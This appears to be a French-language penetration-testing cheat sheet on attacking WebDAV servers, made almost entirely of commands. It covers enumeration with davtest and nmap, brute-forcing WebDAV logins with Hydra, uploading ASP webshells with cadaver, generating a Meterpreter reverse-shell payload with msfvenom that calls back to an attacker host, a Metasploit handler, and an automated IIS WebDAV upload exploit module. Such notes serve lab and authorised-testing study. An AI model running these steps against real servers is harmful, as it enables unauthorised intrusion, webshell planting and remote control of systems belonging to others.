# 📤 Énumération WebDAV

[← Retour à la table des matières](../README.md)

## Davtest
```bash
davtest -url targetIP/directorieSecret
davtest -url targetIP/directorieSecret -u user -p password
davtest -auth bob:password_123321 -url targetIP/directorieSecret
```

## Cadaver (avec authentification)
```bash
cadaver targetIP/directorieSecret
cadaver targetIP/directorieSecret -u user -p password
# Une fois connecté :
put /usr/share/webshells/asp/webshell.asp
```

## IIS WebDAV - Exploitation complète

### Reconnaissance initiale
```bash
# Scan initial pour identifier IIS
nmap -sV -sC targetIP
nmap -sV -p 80 --script=http-enum targetIP
```

### Bruteforce si authentification requise
```bash
# Hydra pour bruteforce WebDAV
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt targetIP http-get /webdav/
```

### Test des capacités WebDAV
```bash
# Test avec davtest
davtest -url http://targetIP/webdav
davtest -auth user:password -url http://targetIP/webdav
```

### Upload de webshells
```bash
# Connexion avec cadaver
cadaver http://targetIP/webdav
# Dans cadaver :
put /usr/share/webshells/asp/webshell.asp
```

### Localisation des webshells
```bash
# Répertoire des webshells
ls /usr/share/webshells/
# Contient : asp/, aspx/, cfm/, jsp/, perl/, php/
```

## Meterpreter via WebDAV

### Génération du payload
```bash
# Génération avec msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f asp > shell.asp
```

### Upload et handler
```bash
# Upload via cadaver
cadaver http://targetIP/webdav
put /path/to/shell.asp

# Handler Metasploit
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 1234
run
```

### Module MSF automatique
```bash
# Module tout-en-un
use exploit/windows/iis/iis_webdav_upload_asp
set HTTPUSERNAME username
set HTTPPASSWORD password
set RHOSTS targetIP
set PATH webdav/metasploit.asp
run
```